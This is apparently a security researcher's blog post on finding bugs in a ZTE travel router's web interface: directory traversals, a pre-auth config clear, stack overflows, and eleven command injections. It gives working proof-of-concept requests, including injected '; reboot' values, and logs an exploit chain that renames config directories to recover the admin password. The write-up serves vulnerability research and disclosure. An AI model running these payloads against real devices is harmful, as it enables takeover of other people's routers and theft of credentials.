---
published: true
title: "🌎 [1] It's Raining Bugs"
toc: true
toc_sticky: true
categories:
  - VR
tags:
  - Memory Corruption
  - Command Injection
  - Authentication Bypass
  - Exploitation
tagline: "In the last blog, we did our initial investigation, extracted firmware, and started reversing the web server. In this blog, we will attempt to find bugs in the web server so that we can achieve code execution via LAN."
excerpt: "Now that we have reverse engineered the web interface, lets hunt for some bugs!"
---

# Pre-auth

Let's start off with the pre-auth surface, as this is far more constrained; so, what can we hit?

- ***/goform*** handlers
- ***/mmc2*** endpoint
- ***/cgi-bin*** endpoint
- The "last" endpoint

I didn't end up spending much time looking at the ***cgi-bin*** endpoint, maybe one for a future blog post. 

Most of the handlers for the HTTP share functionality are accessible pre-auth (they are in the handler whitelist), and interestingly they work even if HTTP share is disabled.

## Arbitrary File Write

Lets start off with a pretty powerful primitive - an arbitrary file write. In the last blog, I covered the process of uploading files to the HTTP share using the ***cgi-bin/zte_httpshare*** endpoint. When looking at the packets, I noticed that if I navigated to a sub directory of the SD card, this didn't appear in the POST request sent to upload the file, so how does it know that the file is destined for the subdirectory?

Well, every time you navigate to any directory (or any other page) of the directory listing in the web interface, it sends a *HTTPSHARE_ENTERFOLD* request with *indexPage* and *path_SD_CARD* parameters. This gets put into an SQL database, which associates the current user with the directory specified in the *path_SD_CARD* parameter. This makes sense as if you are transfering files, there will likely be more than one user viewing the HTTP share.

So, how can we get an arbitrary file write with this? Well, as will become a pretty common theme on this device, there are no checks on the *path_SD_CARD* parameter for directory traversals. So, to get arbitrary write we just have to do the following:
- Send a *HTTPSHARE_ENTERFOLD* request with the *path_SD_CARD* set to ***../../../../../../\*actual path\*/***
- Send the file to the ***/cgi-bin/zte_httpshare*** endpoint

There are constraints however, as most of the filesystem is read-only, we can only write to: ***/tmp***, ***/etc_rw*** and ***/var***.

It does however allow us to overwrite the generated QR code bitmap that gets displayed on the screen if you press one of the buttons a couple of times:

![qr_code_overwrite.jpg](/assets/images/travel_router_hacking_p2/qr_code_overwrite.jpg)

## Arbitrary File Delete 

There is a *HTTPSHARE_DEL* goform command, which takes *path_SD_CARD* and *name_SD_CARD* parameters. Once again, there are no directory traversal checks on the *path_SD_CARD*, so we can delete any file (provided it isn't read-only).

## Arbitrary Directory Create

There is a *HTTPSHARE_NEW* goform command, which takes *path_SD_CARD* and *path_SD_CARD_time_unix* parameters. There are no directory traversal checks on the *path_SD_CARD*, so we can create directories anywhere we want. This is a bit of a non-bug, but it hugely expands attack surface if there is something that parses filenames - like we saw in the camera.

## Arbitrary File Rename

There is a *HTTPSHARE_FILE_RENAME* goform command, which takes *OLD_NAME_SD_CARD* and *NEW_NAME_SD_CARD* parameters. I hate to sound like a broken record, but there are no directory traversal checks on the *OLD_NAME_SD_CARD* and *NEW_NAME_SD_CARD* parameters, so we can rename anything we want (minus read-only stuff of course).

## Arbitrary Config Clear

Finally a bug that isn't a directory traversal! If the request is made from an unauthenticated user, and the request does not have the *multi_data* parameter set, then it will end up in this function:

![config_clear.png](/assets/images/travel_router_hacking_p2/config_clear.png)

Can you see the issue? It is basically extracting the *flag* parameter and checking if the *command_name* that has been passed to the function is in the whitelist. If valid, is sets ***bVar1*** to true and sends back the config value, otherwise it sends back nothing. However, at the end of the function, there is a check on the fetched *flag* parameter. If the value is "*0*", it will clear the value in the config.

This means you can clear literally any config value pre-auth. When I saw this, I assumed this would be an auth-bypass as if you can set the *admin_Password* to be empty, you win right? However, in the *LOGIN* goform command handler, there is a check that the provided admin password in the request is not empty - therefore if the *admin_Password* entry is cleared, it is completely impossible to log in - here is the PoC:

```
http://192.168.1.1/goform/goform_get_cmd_process?cmd=admin_Password&flag=0
```

You can also hit basically the same bug with the *multi_data* parameter set:

```
http://192.168.1.1/goform/goform_get_cmd_process?multi_data=1&cmd=admin_Password&admin_Password_flag=0
```

There is probably a million other ways to mess with the router with this bug, but as its only a clear, it probably wont be much use for code execution.

# Post-auth

We've probably got enough pre-auth issues to form some sort of authentication bypass, so lets move on to post-auth issues.

## Arbitrary Config Write

There is a goform command called ***SET_EXTERNAL_NV***, which takes parameters *external_nv_value* and *external_nv_name*. 

![set_cfg.png](/assets/images/travel_router_hacking_p2/set_cfg.png)

As you can see, it just chucks it straight into the ***cfg_set*** function with the provided arguments, which is a handy primitive to have!

## CHANGE MAC Stack Overflow

Now we are onto some stack overflows, as is usually the case in these cheap devices! This stack overflow is in the *CHANGE_MAC* goform command handler:

![mac_stack_overflow.png](/assets/images/travel_router_hacking_p2/mac_stack_overflow.png)

Can you see the issue in the while loop in the middle of the function? It is copying the MAC address into the stack buffer based on the ':' characters in the provided MAC address, but it doesn't limit how many there can be, so you can trivially overflow the stack buffer with the ***strcat***.

![mac_gdb.png](/assets/images/travel_router_hacking_p2/mac_gdb.png)

Annoyingly, this device has NX on the stack + heap, as well as ASLR - so a leak would be nice to have to exploit this one (no null terminators as per usual).

## REMOVE WHITE SITE Stack Overflow

Another stack overflow, but a bit less trivial this time. Lets take a look at the goform command handler for *REMOVE_WHITE_SITE*:

![remove_white_site_handler.png](/assets/images/travel_router_hacking_p2/remove_white_site_handler.png)

We can see that basically just takes the *ids* parameter, and sends it to some other process (in this case, ***zte_mainctrl***). 

After a bit of reversing, I worked out that the third argument is the actual ID of the message (that the receiver will check for), the fourth argument is the length, and the fifth argument is the data. So, this is sending up to *0xffff* bytes of data that we control to ***zte_mainctrl*** - lets take a look at the handler:

![zte_mainctrl_rm_whitelist_handle.png](/assets/images/travel_router_hacking_p2/zte_mainctrl_rm_whitelist_handle.png)

This is just calling into a subhandler, with the received data (after stripping off some *0x14* byte header):

![zte_mainctrl_overflow.png](/assets/images/travel_router_hacking_p2/zte_mainctrl_overflow.png)

Huh, *0xffff* bytes going into a 100 byte buffer with an ***sprintf()*** call? Looks like a stack overflow to me!

![zte_mainctrl_crash.png](/assets/images/travel_router_hacking_p2/zte_mainctrl_crash.png)

## 11x Command Injection

I had a look at some of the other handlers that fed arguments into the IPC mechanism, and I noticed that they were passing arguments using two methods:
- Sending the data in the IPC message like we saw earlier
- Setting a config value, and then pulling that config value out when the message is received

I went around auditing other handlers on the receiving end of these IPC calls, and for some reason after about 60 of them, 11 of them just slapped the arguments of the web messages straight into ***system()*** as arguments for respective scripts! Here are some PoCs, send any of these pre URL-encoded messages (after logging in) to ***/goform/goform_set_cmd_process*** and the router will restart:

- *PINT_DIAGNOSTICS_START*: 

```
goformId=PINT_DIAGNOSTICS_START&ping_diag_addr=127.0.0.1&ping_repetition_count=1&ping_time_out=1&ping_data_size=1&ping_diag_interface=eth0 ; reboot ;
```

- *ADD_WHITE_SITE*: 

```
goformId=ADD_WHITE_SITE&name=test" ; reboot #&site=test
```

- *REMOVE_WHITE_SITE*: 

```
goformId=REMOVE_WHITE_SITE&ids=test" ; reboot #
```

- *DEL_DEVICE* : 

```
goformId=DEL_DEVICE&mac=" ; reboot;######
```

- *ADD_DEVICE* : 

```
goformId=ADD_DEVICE&mac=%" ; reboot;######
```

- *BIND_STATIC_ADDRESS_DEL* : 

```
goformId=BIND_STATIC_ADDRESS_DEL&mac_address=; reboot ########
```

- *BIND_STATIC_ADDRESS_ADD* : 

```
goformId=BIND_STATIC_ADDRESS_ADD&mac_address=00:00:00:00:00:00&ip_address=; reboot ;
```

- *EDIT_HOSTNAME* : 

```
goformId=EDIT_HOSTNAME&mac=00:00:00:00:00:00&hostname="; reboot #
```

- *DMZ_SETTING* : 

```
goformId=DMZ_SETTING&DMZEnabled=1&DMZIPAddress=127.0.0.1 ; reboot #
```

- *STATIC_DHCP_SETTING* : 

```
goformId=STATIC_DHCP_SETTING&mac_ip_list=+ + | reboot # ;
```

- *URL_FILTER_ADD* : 

```
goformId=URL_FILTER_ADD&addURLFilter=| reboot ; 
```

It is worth noting that some of these are constrained on size (mainly the ones padded with '#' characters), one of the best is *REMOVE_WHITE_SITE*.

## Honourable Mentions

There is a bug in the ***parseStrBySemicolon*** function, which is used by the following goform handlers:
- ***SAVE_SMS***
- ***SEND_SMS***
- ***DELETE_SMS***
- ***MOVE_TO_SIM***

If you send a *msg_id* parameter with a huge number of semicolons, the program will crash because of a stack overflow - which with a large number of semicolons goes off the end of the allocated stack region, causing a crash:

![sms_msg_id_overflow.png](/assets/images/travel_router_hacking_p2/sms_msg_id_overflow.png)

Here is the code snippet that is causing the crash, it is crashing when it tries to write a 0 outside of the stack region:

![zte_parse_semicolon_snippet.png](/assets/images/travel_router_hacking_p2/zte_parse_semicolon_snippet.png)

I had better bugs when I found this, so I haven't looked into it much - but with a bit of work, it could probably be exploited (with a leak, of course).

# Writing the Exploit

Okay, so we have an absolute boat load of bugs - lets now try and go from pre-auth to executing code as root!

## Bugs

The bugs I used for the full chain are the following:
- ***HTTPSHARE_FILE_RENAME*** arbitrary file rename
- ***REMOVE_WHITE_SITE*** command injection

## Weakness: QR Code Endpoint

How did I get an auth bypass with just a rename primitive? Well, we will need to go back to the *Last* endpoint I mentioned near the end of the last blog, and take another look at the code for fetching the credentials encoded in a QR code:

![qr_code_fetch.png](/assets/images/travel_router_hacking_p2/qr_code_fetch.png)

We can see in the code that it is using ***strstr()*** to check if ***img/qrcode_ssid_wifikey.png*** or ***img/qrcode_multi_ssid_wifikey.png*** is present in the URL. If either of them are present, then the *wifi_root_dir* value is fetched from the config (which is ***/etc_rw***).

What it then does, is uses ***strstr()*** on the URL again to locate ***img/qrcode_***. Finally, it builds a complete filename -  ***/etc_rw/wifi/qrcode_...***, where ... is EVERYTHING after ***qrcode_*** from the initial URL. 

In other words, if we sent the following request:

```
http://192.168.2.1/img/qrcode_multi_ssid_wifikey.png/hello
```

It would fetch the ***hello*** file from the ***/etc_rw/wifi/qrcode_multi_ssid_wifikey.png*** directory (if there was a directory with this name).

## Auth Bypass

Lets take a look at the location of the config: ***/etc_rw/nv/main/cfg***. Lets also change the name of our last example from ***hello*** to ***cfg***: ***/etc_rw/wifi/qrcode_multi_ssid_wifikey.png/cfg***. Do you see it yet?

Both files are within the ***/etc_rw*** directory, and are two directories deep, so all we need to do is the following:
- Rename ***/etc_rw/wifi*** to ***/etc_rw/wifi_backup***
- Rename ***/etc_rw/nv*** to ***/etc_rw/wifi***
- Rename ***/etc_rw/wifi/main*** to ***/etc_rw/wifi/qrcode_multi_ssid_wifikey.png***

Then, we can simply send the following request to get the config that contains the admin password (don't forget to rename everything back after!):

```
http://192.168.2.1/img/qrcode_multi_ssid_wifikey.png/cfg
```

And that is the admin bypass, here is a demo:

```
[*] Sending data: goformId=HTTPSHARE_FILE_RENAME&OLD_NAME_SD_CARD=%2Fmmc2%2F.%2F..%2F..%2F..%2Fetc_rw%2Fwifi&NEW_NAME_SD_CARD=%2Fmmc2%2F.%2F..%2F..%2F..%2Fetc_rw%2Fwifi_backup
[*] Status Code: 200
[*] Response Body: {"result":"success"}

[*] Sending data: goformId=HTTPSHARE_FILE_RENAME&OLD_NAME_SD_CARD=%2Fmmc2%2F.%2F..%2F..%2F..%2Fetc_rw%2Fnv%2Fbackup&NEW_NAME_SD_CARD=%2Fmmc2%2F.%2F..%2F..%2F..%2Fetc_rw%2Fnv%2Fqrcode_ssid_wifikey.png
[*] Status Code: 200
[*] Response Body: {"result":"success"}

[*] Sending data: goformId=HTTPSHARE_FILE_RENAME&OLD_NAME_SD_CARD=%2Fmmc2%2F.%2F..%2F..%2F..%2Fetc_rw%2Fnv&NEW_NAME_SD_CARD=%2Fmmc2%2F.%2F..%2F..%2F..%2Fetc_rw%2Fwifi
[*] Status Code: 200
[*] Response Body: {"result":"success"}

[*] Sending GET HTTP request to http://192.168.1.1/img/qrcode_ssid_wifikey.png/cfg
[+] Download complete, file saved to pulled_cfg
[+] Recovered admin password: admin

[*] Sending data: goformId=HTTPSHARE_FILE_RENAME&OLD_NAME_SD_CARD=%2Fmmc2%2F.%2F..%2F..%2F..%2Fetc_rw%2Fwifi&NEW_NAME_SD_CARD=%2Fmmc2%2F.%2F..%2F..%2F..%2Fetc_rw%2Fnv
[*] Status Code: 200
[*] Response Body: {"result":"success"}

[*] Sending data: goformId=HTTPSHARE_FILE_RENAME&OLD_NAME_SD_CARD=%2Fmmc2%2F.%2F..%2F..%2F..%2Fetc_rw%2Fnv%2Fqrcode_ssid_wifikey.png&NEW_NAME_SD_CARD=%2Fmmc2%2F.%2F..%2F..%2F..%2Fetc_rw%2Fnv%2Fbackup
[*] Status Code: 200
[*] Response Body: {"result":"success"}

[*] Sending data: goformId=HTTPSHARE_FILE_RENAME&OLD_NAME_SD_CARD=%2Fmmc2%2F.%2F..%2F..%2F..%2Fetc_rw%2Fwifi_backup&NEW_NAME_SD_CARD=%2Fmmc2%2F.%2F..%2F..%2F..%2Fetc_rw%2Fwifi
[*] Status Code: 200
[*] Response Body: {"result":"success"}
```

With the admin bypass we needed, we can use any of the post-auth command injections to run arbitrary commands as root on the router. We can also run any cross-compiled binary we want; so, now it's just a matter of writing some code.

# Conclusion

In this blog, we achieved the initial goal of the project - pre-auth code execution over LAN, using a couple of bugs we found while auditing the code. In the next blog, we will do something intriguing with our newfound privileges.